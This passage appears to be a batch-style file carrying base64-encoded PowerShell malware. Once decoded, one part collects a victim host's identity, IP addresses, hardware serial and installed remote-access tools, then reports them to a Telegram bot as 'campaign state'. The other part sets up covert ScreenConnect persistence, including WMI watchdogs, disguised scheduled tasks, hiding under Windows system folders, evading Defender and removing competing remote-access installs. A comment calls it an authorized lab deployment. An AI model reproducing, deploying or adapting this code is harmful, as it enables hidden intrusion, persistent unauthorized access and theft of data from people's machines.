::ezF9PC9jb2RlPiAtIHsyfXszfScgLWYgJG1hcmssIChFc2MgJHQuTmFtZSksIChF
::c2MgJHQuUm9sZSksIChFc2MgJGV4dHJhKSkpDQp9DQoNCiRwcmltTGluZSA9IEdl
::dC1TdmNMaW5lICRwcmltDQokYWx0TGluZSA9IEdldC1TdmNMaW5lICRhbHQNCiRw
::cmltT2sgPSAkcHJpbUxpbmUgLWxpa2UgJ1J1bm5pbmcqJw0KJGRlcGxveU9rID0g
::JHByaW1PayAtYW5kICgkdGFza09rIC1nZSAzKSAtYW5kICRoYXNNb24NCg0KJGVt
::b2ppTWFwID0gQHsNCiAgICBPSyAgICAgICA9IFtzdHJpbmddKFtjaGFyXTB4Mjcw
::NSkNCiAgICBET1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21V
::dGYzMigweDFGNkE4KSkNCiAgICBSRVNUT1JFRCA9IChbc3RyaW5nXVtjaGFyXTo6
::Q29udmVydEZyb21VdGYzMigweDFGN0UyKSkNCiAgICBGQUlMICAgICA9IFtzdHJp
::bmddKFtjaGFyXTB4Mjc0QykNCiAgICBGT1JDRSAgICA9IFtzdHJpbmddKFtjaGFy
::XTB4MjZBMSkNCiAgICBERVBMT1kgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVy
::dEZyb21VdGYzMigweDFGNjgwKSkNCiAgICBIQiAgICAgICA9IChbc3RyaW5nXVtj
::aGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNEUxKSkNCn0NCiRrZXkgPSAkU3Rh
::dGUuVG9VcHBlckludmFyaWFudCgpDQokZW1vamkgPSBpZiAoJGVtb2ppTWFwLkNv
::bnRhaW5zS2V5KCRrZXkpKSB7ICRlbW9qaU1hcFska2V5XSB9IGVsc2UgeyAoW3N0
::cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRGMSkpIH0NCg0KJHRp
::dGxlID0gc3dpdGNoICgka2V5KSB7DQogICAgJ09LJyB7ICdQcmltYXJ5IGhlYWx0
::aHknIH0NCiAgICAnRE9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQ0K
::ICAgICdSRVNUT1JFRCcgeyAnUHJpbWFyeSBSRVNUT1JFRCcgfQ0KICAgICdGQUlM
::JyB7ICdIZWFsIEZBSUxFRCcgfQ0KICAgICdGT1JDRScgeyAnRm9yY2VkIHJlaW5z
::dGFsbCcgfQ0KICAgICdERVBMT1knIHsgaWYgKCRkZXBsb3lPaykgeyAnRklSU1Qg
::REVQTE9ZIE9LJyB9IGVsc2UgeyAnRklSU1QgREVQTE9ZIC0gQ0hFQ0sgTkVFREVE
::JyB9IH0NCiAgICAnSEInIHsgJ2hvdXJseSBkaWdlc3QnIH0NCiAgICBkZWZhdWx0
::IHsgIlN0YXRlOiAkU3RhdGUiIH0NCn0NCg0KJHRyYW5zID0gaWYgKCRPbGRTdGF0
::ZSkgeyAiJE9sZFN0YXRlIC0+ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0NCiRz
::Y0xpc3QgPSBHZXQtU2NJbnN0YWxscw0KJHJtbUhpdHMgPSBHZXQtUm1tSGl0cw0K
::aWYgKCRybW1IaXRzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRybW1IaXRzLkFkZCgn
::LSAobm9uZSBkZXRlY3RlZCknKSB9DQoNCiRwdWIgPSBHZXQtUHVibGljSXANCiRs
::YW4gPSBHZXQtTG9jYWxJcHMNCiRub3cgPSBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5
::LU1NLWRkIEhIOm1tOnNzIHp6eicNCiR1cHRpbWUgPSAnbi9hJw0KdHJ5IHsNCiAg
::ICAkYm9vdCA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVt
::KS5MYXN0Qm9vdFVwVGltZQ0KICAgICR1cHRpbWUgPSAnezA6ZGR9ZCB7MDpoaH1o
::IHswOm1tfW0nIC1mICgoR2V0LURhdGUpIC0gJGJvb3QpDQp9IGNhdGNoIHt9DQoN
::CiMgY2FtcGFpZ24gc3RhdGUgZmlsZSAod3JpdHRlbiBieSBvd25fbGliLnBzMSBz
::dGF0ZSBhY3Rpb24pDQokc3RhdGVMaW5lID0gJ24vYScNCiRzdGF0ZU9iaiA9ICRu
::dWxsDQokc3RhdGVQYXRoMiA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNv
::bicNCmlmIChUZXN0LVBhdGggJHN0YXRlUGF0aDIpIHsNCiAgICAkcmF3U3RhdGUg
::PSAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGgyIC1SYXcpLlRy
::aW0oKQ0KICAgIHRyeSB7DQogICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8
::IENvbnZlcnRGcm9tLUpzb24NCiAgICAgICAgJGZvcmVpZ25Dc3YgPSBpZiAoJHN0
::YXRlT2JqLmZvcmVpZ24pIHsgKCRzdGF0ZU9iai5mb3JlaWduIC1qb2luICcsJykg
::fSBlbHNlIHsgJy0nIH0NCiAgICAgICAgJHN0YXRlTGluZSA9ICJwcmltPSQoJHN0
::YXRlT2JqLnByaW0pIGFsdD0kKCRzdGF0ZU9iai5hbHQpIGZvcmVpZ249WyRmb3Jl
::aWduQ3N2XSB0YXNrcz0kKCRzdGF0ZU9iai50YXNrc09rKS8kKCRzdGF0ZU9iai50
::YXNrc1RvdGFsKSB3ZD0kKCRzdGF0ZU9iai53YXRjaGRvZykgaGVhbHM9JCgkc3Rh
::dGVPYmouaW5zdGFsbENvdW50KSINCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9
::ICRyYXdTdGF0ZSB9DQp9DQoNCiRkZXBsb3lCbG9jayA9ICcnDQppZiAoJGtleSAt
::ZXEgJ0RFUExPWScpIHsNCiAgICAkdmVyZGljdCA9IGlmICgkZGVwbG95T2spIHsg
::J0RFUExPWUVEIC8gSEVBTFRIWScgfSBlbHNlIHsgJ0RFUExPWUVEIEJVVCBJTkNP
::TVBMRVRFJyB9DQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBhdGgg
::IiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtl
::bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURp
::cmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAg
::IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW5vdG1hdGNoICgiNWY2MDEwNTc5ODUy
::ZTUwN3xmODYxYzgxNDBkNDUzNDI3fHswfSIgLWYgKEdldC1Hcnl4YUtlZXBGcCkp
::IH0pDQogICAgJGRpYWdMaW5lcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rp
::b25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJGJvb3RQYXRoID0gSm9pbi1Q
::YXRoICRXb3JrRGlyICdib290LmVycicNCiAgICBpZiAoVGVzdC1QYXRoICRib290
::UGF0aCkgew0KICAgICAgICAkaW50ZXJlc3RpbmcgPSBAKA0KICAgICAgICAgICAg
::J21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlfJywgJ251a2VfJywgJ21zaV90b28n
::LCAnbXNpX2ZldGNoJywgJ21zaV9leGl0JywNCiAgICAgICAgICAgICdtc2lfdW5h
::dmFpbGFibGUnLCAnc2VjdXJlXycsICdnb18nLCAnZXh0ZXJtaW5hdGVfJywgJ2lk
::ZW50aXR5XycsDQogICAgICAgICAgICAnY3JlYXRlX3Rhc2snLCAndmVyaWZ5X3Rh
::c2snLCAnb3JwaGFuXycsICdzdGFsZV8nLCAncG9zdGluc3RhbGwnLCAnYWx0XycN
::CiAgICAgICAgKQ0KICAgICAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGJv
::b3RQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAg
::ICAgIFdoZXJlLU9iamVjdCB7DQogICAgICAgICAgICAgICAgJGxpbmUgPSAkXw0K
::ICAgICAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICRpbnRlcmVzdGluZykgeyBp
::ZiAoJGxpbmUgLWxpa2UgIiokdCoiKSB7IHJldHVybiAkdHJ1ZSB9IH0NCiAgICAg
::ICAgICAgICAgICAkZmFsc2UNCiAgICAgICAgICAgIH0gfA0KICAgICAgICAgICAg
::U2VsZWN0LU9iamVjdCAtTGFzdCAyNiB8DQogICAgICAgICAgICBGb3JFYWNoLU9i
::amVjdCB7IFt2b2lkXSRkaWFnTGluZXMuQWRkKCgnLSA8Y29kZT57MH08L2NvZGU+
::JyAtZiAoRXNjICgkXyAtcmVwbGFjZSAnW15ceDIwLVx4N0VdJywgJz8nKSkpKSB9
::DQogICAgfQ0KICAgIGlmICgkZGlhZ0xpbmVzLkNvdW50IC1lcSAwKSB7IFt2b2lk
::XSRkaWFnTGluZXMuQWRkKCctIChubyBpbnN0YWxsL251a2UgbWFya2VycyBpbiBi
::b290LmVyciknKSB9DQogICAgJGRlcGxveUJsb2NrID0gQCINCg0KPGI+RGVwbG95
::IHZlcmRpY3Q8L2I+DQotIFJlc3VsdDogPGI+JChFc2MgJHZlcmRpY3QpPC9iPg0K
::LSBQcmltYXJ5IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsgJ1lFUycgfSBlbHNl
::IHsgJ05PJyB9KQ0KLSBNb25pdG9yIHNjcmlwdCAoLnd1Y2FjaGVcb3duX21vbi5j
::bWQpOiAkKGlmICgkaGFzTW9uKSB7ICdZRVMnIH0gZWxzZSB7ICdOTycgfSkNCi0g
::QmFja3VwIG1vbiAoLmV0bGNhY2hlXGV0bF9tb24uY21kKTogJChpZiAoJGhhc0V0
::bCkgeyAnWUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIFBlcnNpc3QgdGFza3MgT0s6
::ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tzLkNvdW50KSAoYmFkL21pc3Npbmc6
::ICR0YXNrQmFkKQ0KLSBNU0kgY2FjaGU6ICQoRXNjICRtc2lTaXplKQ0KLSBGb3Jl
::aWduIFNDIGZvbGRlcnMgbGVmdDogJCgkZm9yZWlnbi5Db3VudCkNCi0gTm90ZTog
::TGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5ZXQgcnVuIChub3JtYWwgcmln
::aHQgYWZ0ZXIgY3JlYXRlKQ0KDQo8Yj5EZXBsb3kgbG9nIG1hcmtlcnM8L2I+DQok
::KCRkaWFnTGluZXMgLWpvaW4gImBuIikNCiJADQp9DQoNCiR0ZXh0ID0gQCINCiRl
::bW9qaSA8Yj5TQyBNb25pdG9yIC0gJChFc2MgJHRpdGxlKTwvYj4NCg0KPGI+RXZl
::bnQ8L2I+DQotIFN1bW1hcnk6ICQoRXNjICRTdW1tYXJ5KQ0KLSBUcmFuc2l0aW9u
::OiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPg0KLSBXaGVuOiAkKEVzYyAkbm93
::KQ0KLSBTb3VyY2UgYnVpbGQ6IDxjb2RlPiQoRXNjICRCdWlsZCk8L2NvZGU+DQok
::ZGVwbG95QmxvY2sNCg0KPGI+SG9zdDwvYj4NCi0gQ29tcHV0ZXI6IDxjb2RlPiQo
::RXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4NCi0gVXNlcjogPGNvZGU+JChF
::c2MgJHdobyk8L2NvZGU+DQotIEVsZXZhdGVkOiAkZWxldiB8IFNZU1RFTTogJGlz
::U3lzdGVtDQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pDQoN
::CjxiPk5ldHdvcms8L2I+DQotIExBTiBJUHM6IDxjb2RlPiQoRXNjICRsYW4pPC9j
::b2RlPg0KLSBQdWJsaWMgSVA6IDxjb2RlPiQoRXNjICRwdWIpPC9jb2RlPg0KDQo8
::Yj5PUyAvIEhhcmR3YXJlPC9iPg0KLSBPUzogJChFc2MgJG9zLkNhcHRpb24pDQot
::IFZlcnNpb246ICQoRXNjICRvcy5WZXJzaW9uKSAoYnVpbGQgJChFc2MgJG9zLkJ1
::aWxkKSkgJChFc2MgJG9zLkFyY2gpDQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0
::YWxsRGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkNCi0gVXB0
::aW1lOiAkKEVzYyAkdXB0aW1lKQ0KLSBDUFU6ICQoRXNjICRvcy5DUFUpDQotIEhh
::cmR3YXJlOiAkKEVzYyAkb3MuTWFudWZhY3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwp
::DQotIFNlcmlhbDogPGNvZGU+JChFc2MgJG9zLlNlcmlhbCk8L2NvZGU+DQotIFJB
::TTogJCgkb3MuVG90YWxSQU1fR0IpIEdCDQotIERpc2sgQzogJCgkb3MuRGlza0Zy
::ZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0INCg0KPGI+U2Ny
::ZWVuQ29ubmVjdCAoYWxsKTwvYj4NCi0gU2V2cnogPGNvZGU+NWY2MDEwNTc5ODUy
::ZTUwNzwvY29kZT46ICQoRXNjICRwcmltTGluZSkNCi0gQWx0IDxjb2RlPmY4NjFj
::ODE0MGQ0NTM0Mjc8L2NvZGU+OiAkKEVzYyAkYWx0TGluZSkNCi0gR3J5eGEgPGNv
::ZGU+JChFc2MgKEdldC1Hcnl4YUtlZXBGcCkpPC9jb2RlPjogJChFc2MgKEdldC1T
::dmNMaW5lICgiU2NyZWVuQ29ubmVjdCBDbGllbnQgKHswfSkiIC1mIChHZXQtR3J5
::eGFLZWVwRnApKSkpDQokKCRzY0xpc3QgLWpvaW4gImBuIikNCg0KPGI+T3RoZXIg
::Uk1NIC8gcmVtb3RlIHRvb2xzPC9iPg0KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQ0K
::DQo8Yj5QZXJzaXN0IHRhc2tzIChleHBlY3RlZCk8L2I+DQokKCR0YXNrTGluZXMg
::LWpvaW4gImBuIikNCg0KPGI+Q2FjaGU8L2I+DQotIE1TSSBjYWNoZTogJChFc2Mg
::JG1zaVNpemUpDQotIFdvcmtEaXI6IDxjb2RlPiQoRXNjICRXb3JrRGlyKTwvY29k
::ZT4NCg0KPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3Qp
::PC9iPg0KLSA8Y29kZT5NT049JGJNb24gfCBTRUM9JGJTZWMgfCBUR1I9JGJUZ3Ig
::fCBMSUI9JGJMaWI8L2NvZGU+DQoNCjxiPkNhbXBhaWduIHN0YXRlPC9iPg0KLSA8
::Y29kZT4kKEVzYyAkc3RhdGVMaW5lKTwvY29kZT4NCg0KPGk+Qm90OiBAbm9idWRk
::eXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4NCiJADQoNCiMgY29tcGFjdCBk
::aWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhl
::YXJ0YmVhdCkNCmlmICgkTW9kZSAtZXEgJ2NvbXBhY3QnKSB7DQogICAgJGZvcmVp
::Z25OID0gMA0KICAgIGlmICgkc3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWln
::bikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9iai5mb3JlaWduKS5Db3VudCB9DQog
::ICAgJG1zaVNob3J0ID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsgJ3swOk4w
::fUtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2UpLkxlbmd0aCAvIDFL
::QikgfSBlbHNlIHsgJzAnIH0NCiAgICAkcHJpbVNob3J0ID0gaWYgKCRwcmltT2sp
::IHsgJ09LJyB9IGVsc2UgeyAnRE9XTicgfQ0KICAgICRhbHRTaG9ydCA9IGlmICgk
::YWx0TGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0N
::CiAgICAkZ3J5eGFMaW5lID0gR2V0LVN2Y0xpbmUgKCJTY3JlZW5Db25uZWN0IENs
::aWVudCAoezB9KSIgLWYgKEdldC1Hcnl4YUtlZXBGcCkpDQogICAgJGdyeXhhU2hv
::cnQgPSBpZiAoJGdyeXhhTGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBl
::bHNlIHsgJy0nIH0NCiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01Q
::VVRFUk5BTUUpfHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9ydHxhbHQ9JGFs
::dFNob3J0fGY9JGZvcmVpZ25OfHQ9JHRhc2tPay81fGI9JEJ1aWxkIg0KfQ0KDQpp
::ZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7DQogICAgJHJtbUhpdHMgPSBAKCgk
::cm1tSGl0cyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEyKSkgKyAoJy0gLi4uICh7
::MH0gbW9yZSknIC1mICgkcm1tSGl0cy5Db3VudCAtIDEyKSkNCiAgICAkc2NMaXN0
::ID0gQCgoJHNjTGlzdCB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDE0KSkgKyAoJy0g
::Li4uICh7MH0gbW9yZSknIC1mICgkc2NMaXN0LkNvdW50IC0gMTQpKQ0KICAgICR0
::ZXh0ID0gJHRleHQuU3Vic3RyaW5nKDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FU
::RUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiINCn0NCg0KJGxvZyA9IEpvaW4t
::UGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQpmdW5jdGlvbiBTZW5kLVRnKFtzdHJp
::bmddJG1zZywgW3N0cmluZ10kbW9kZSkgew0KICAgICRwYXlsb2FkID0gQHsNCiAg
::ICAgICAgY2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lEDQog
::ICAgICAgIHRleHQgICAgICAgICAgICAgICAgICAgICA9ICRtc2cNCiAgICAgICAg
::ZGlzYWJsZV93ZWJfcGFnZV9wcmV2aWV3ID0gJHRydWUNCiAgICB9DQogICAgaWYg
::KCRtb2RlKSB7ICRwYXlsb2FkLnBhcnNlX21vZGUgPSAkbW9kZSB9DQogICAgJGpz
::b24gPSAkcGF5bG9hZCB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyAtRGVwdGgg
::NQ0KICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0
::Qnl0ZXMoJGpzb24pDQogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAoImh0dHBz
::Oi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRjZmcuQk9UX1RPS0VOKS9zZW5kTWVz
::c2FnZSIpIGANCiAgICAgICAgLU1ldGhvZCBQb3N0IC1Cb2R5ICRieXRlcyAtQ29u
::dGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgnIHwgT3V0
::LU51bGwNCn0NCg0KZnVuY3Rpb24gU2VuZC1UZ1NhZmUoW3N0cmluZ10kbXNnLCBb
::c3RyaW5nXSRtb2RlKSB7DQogICAgJHRvU2VuZCA9ICRtc2cNCiAgICB0cnkgew0K
::ICAgICAgICBTZW5kLVRnIC1tc2cgJHRvU2VuZCAtbW9kZSAkbW9kZQ0KICAgICAg
::ICByZXR1cm4gJHRydWUNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdHJ5IHsNCiAg
::ICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJzdHJpbmcoMCwgMzAw
::MCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUNCiAgICAgICAg
::ICAgIHJldHVybiAkdHJ1ZQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAg
::IHJldHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KdHJ5IHsNCiAg
::ICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAkdGV4dCAtbW9kZSAnSFRNTCcpIHsNCiAg
::ICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19z
::ZW50X3JpY2gnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfSBl
::bHNlIHsNCiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJw0KICAgIH0NCiAgICBp
::ZiAoJGtleSAtZXEgJ0RFUExPWScpIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxp
::dGVyYWxQYXRoICRsb2cgLVZhbHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95
::T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIFNldC1D
::b250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdkZXBsb3lf
::dGcuZmxhZycpIC1WYWx1ZSAoR2V0LURhdGUgLUZvcm1hdCAnbycpIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KfSBjYXRjaCB7DQogICAgdHJ5
::IHsNCiAgICAgICAgJHBsYWluID0gW3JlZ2V4XTo6UmVwbGFjZSgkdGV4dCwgJzxb
::Xj5dKz4nLCAnJykNCiAgICAgICAgJHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRp
::bGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQ0KICAgICAgICBpZiAoJHBsYWluLkxl
::bmd0aCAtZ3QgMzUwMCkgeyAkcGxhaW4gPSAkcGxhaW4uU3Vic3RyaW5nKDAsIDM1
::MDApICsgImBuVFJVTkNBVEVEIiB9DQogICAgICAgIFNlbmQtVGdTYWZlIC1tc2cg
::JHBsYWluIC1tb2RlICcnIHwgT3V0LU51bGwNCiAgICAgICAgQWRkLUNvbnRlbnQg
::LUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBB
::ZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCJ0Z19mYWlsICIg
::KyAkXy5FeGNlcHRpb24uTWVzc2FnZSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICB9DQp9DQo=
::B64_TGR_END
::B64_LIB_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZANCiMgT1dOX0xJQiAgQlVJTEQgMjAyNjA4
::MDRMNDANCiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
::LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZw0KIyAobXV0dWFsIHBlcnNpc3RlbmNl
::IGNoYWluKSwgY2FtcGFpZ24gc3RhdGUgZmlsZSwgU0Mgc2VydmljZSByZXBhaXIu
::DQojIEw0MjogRlAgbWlncmF0ZSBpbnN0YWxsLW5ldy1GSVJTVCB0aGVuIGRlZmVy
::LXJlbW92ZS1vbGQgKG5ldmVyIGxlYXZlIGhvc3Qgd2l0aCB6ZXJvIEdyeXhhKS4N
::CiMgTDQxOiAtRm9yY2UgTkVWRVIgL3grL2kgd2hlbiBHcnl4YSBhbHJlYWR5IFJ1
::bm5pbmcgKGZvcmNlX2dyeXhhLmZsYWcgd2FzIGtpbGxpbmcgbGl2ZSBHdWVzdCku
::DQojIEwzOTogcmVsYXktdmVyaWZpZWQgR3J5eGEga2VlcGVyIGFkb3B0aW9uOyBJ
::TkZMSUdIVOKJoEhFQUxUSFk7IHJlYWwgLUZvcmNlLy1EZWVwOw0KIyAgICAgIHBv
::c3QtR3J5eGEgL2kgc2V2cnogcmVzdG9yZTsgVGVzdC1Nc2lQYWNrYWdlOyBUQVNL
::X0cgaW4gc3RhdGU7IHBlcnNpc3RlbmNlIHB1cmdlIHcvbyBGUC1vbmx5Lg0KIyBM
::Mzg6IFRBU0tfRyBXdWNhY2hlR3J5eGFCb290IE9OU1RBUlQgcnVucyBncnl4YS1l
::bnN1cmUgLU5vV2FpdCAtRm9yY2UgYXQgYm9vdCAoRGVmZW5kZXIgc3RyaXBzIFND
::TSBlbnRyeSBhdCBzdGFydHVwKS4gTDM3OiBNU0kgbWFnaWMrRlAgdmFsaWRhdGUu
::DQojIEwyMTogc3R1Y2sgcmVnaXN0ZXJlZCAoc3ZjK2RpciBnb25lKSAtPiAvZmEg
::dGhlbiBBUlAgbnVrZSArIHNhbWUtRlAgL2k7IHJldHVybiBmaXguDQojIEwyMDog
::LURlZXAgbXVzdCBub3Qgc2tpcCBsaWdodCBzdGFydC9yZXBhaXIgKHJhdGUtbGlt
::aXQgbGVmdCBHcnl4YSBTdG9wcGVkKS4NCiMgTDE5OiByYXRlLWxpbWl0IG5ldmVy
::IGJsb2NrcyB3aGVuIEdyeXhhIGZ1bGx5IGFic2VudDsgU3RhcnRQZW5kaW5nIGtl
::ZXAuDQojIEwxODogZXh0ZXJtaW5hdGUgd2FzIEtJTExJTkcgR3J5eGEgKG51bGwt
::cGF0aCBwcm9jIGtpbGwpOyBzeW5jIEZQIGJlZm9yZSBraWxsLg0KIyBMMTc6IEdy
::eXhhIHJlaW5zdGFsbCBMT0NLIHdoaWxlIGFueSBub24tc2V2cnogU0MgUnVubmlu
::ZzsgRlAgZHJpZnQgbmV2ZXIgL3guDQojIEwxNjogTkVWRVIgcmVpbnN0YWxsIEdy
::eXhhIHdoZW4gUnVubmluZyAocGFuZWwgZHVwbGljYXRlcyk7IFRDUCBhZHZpc29y
::eSBvbmx5Lg0KIyBMMTU6IGdyeXhhLWhlYWx0aCAvIGdyeXhhLWVuc3VyZSDigJQg
::OGggZGVlcCBjaGVjayAoVENQL3JlbGF5L0ZQIGRyaWZ0IHJlaW5zdGFsbCkuDQoj
::IEwxMzogc2NodGFza3MgQ3JlYXRlIHZpYSBjbWQgKGxpa2UgV3VjYWNoZU93biks
::IFRSIHVuZGVyIFdpbmRvd3NcVGVtcFwud3VjYWNoZQ0KIyAgICAgIChub3QgQUNM
::LWxvY2tlZCBQcm9ncmFtRGF0YSBwYXRoKSwgL1NUIDAwOjAwIG9uIE1JTlVURSwg
::bm8gbGVhZGluZyBcLg0KIyBMMTI6IElERU5UVkVSPTcgUk9PVC1sZXZlbCB0YXNr
::IG5hbWVzIChuZXN0ZWQgTWljcm9zb2Z0XFdpbmRvd3MgQWNjZXNzIERlbmllZCku
::DQojIEwxMTogTkVWRVIgcmV1c2UgcmVhbCBXaW5kb3dzIGJ1aWx0LWluIHRhc2sg
::bmFtZXM7IFRSIG93bmVyc2hpcCBjaGVja3MuDQojIEF1dGhvcml6ZWQgaW50ZXJu
::YWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5Lg0KIyDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZANCltD
::bWRsZXRCaW5kaW5nKCldDQpwYXJhbSgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9y
::eSA9ICR0cnVlKV0NCiAgICBbVmFsaWRhdGVTZXQoJ2luaXQnLCAnd2F0Y2hkb2cn
::LCAnd2F0Y2hkb2ctZW5zdXJlJywgJ3Rhc2tzLWVuc3VyZScsICdzdGF0ZScsICdp
::ZGVudGl0eScsICdyZXBhaXInLCAncmVnaXN0ZXJlZCcsICdleHRlcm1pbmF0ZScs
::ICdncnl4YS1oZWFsdGgnLCAnZ3J5eGEtZW5zdXJlJywgJ3N5bmMtZ3J5eGEtZnAn
::LCAndGVzdC1tc2knLCAncHJvdGVjdC1tc2knLCAndmVyaWZ5LXVwZGF0ZScsICdz
::eW5jLXNldnJ6LWZwJyldDQogICAgW3N0cmluZ10kQWN0aW9uLA0KICAgIFtzdHJp
::bmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3Nc
::V0VSXFRlbXBcLnd1Y2FjaGUnLA0KICAgIFtzdHJpbmddJE1vblBhdGggPSAnJywN
::CiAgICBbc3RyaW5nXSRCdWlsZCAgPSAnTzE1JywNCiAgICBbc3RyaW5nXSRFeHRy
::YSAgPSAnJywNCiAgICBbc3RyaW5nXSRGcCAgICAgPSAnJywNCiAgICBbc3dpdGNo
